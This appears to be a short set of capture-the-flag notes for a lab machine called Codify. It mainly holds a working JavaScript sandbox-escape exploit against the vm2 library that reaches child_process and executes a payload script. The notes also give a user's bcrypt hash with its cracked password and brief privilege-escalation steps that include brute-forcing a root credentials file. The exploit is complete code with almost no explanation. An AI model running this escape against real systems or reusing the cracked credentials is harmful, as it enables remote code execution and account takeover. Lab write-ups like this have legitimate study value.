##Codify Notes

### Vm2 vulnerable to RCE

		
		const {VM} = require("vm2");
		const vm = new VM();

		const code = `
		err = {};
		const handler = {
		    getPrototypeOf(target) {
			(function stack() {
			    new Error().stack;
			    stack();
			})();
		    }
		};
		  
		const proxiedErr = new Proxy(err, handler);
		try {
		    throw proxiedErr;
		} catch ({constructor: c}) {
		    c.constructor('return process')().mainModule.require('child_process').execSync('payload.sh')
		}
		`

		console.log(vm.run(code));
		


### Joshua password
/var/www/content/ -> hashed password

joshua $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

cracked hash : spongebob1

### Privesc :

sudo -l -> mysql_backup.sh 

python script to bruteforce /root/.creds
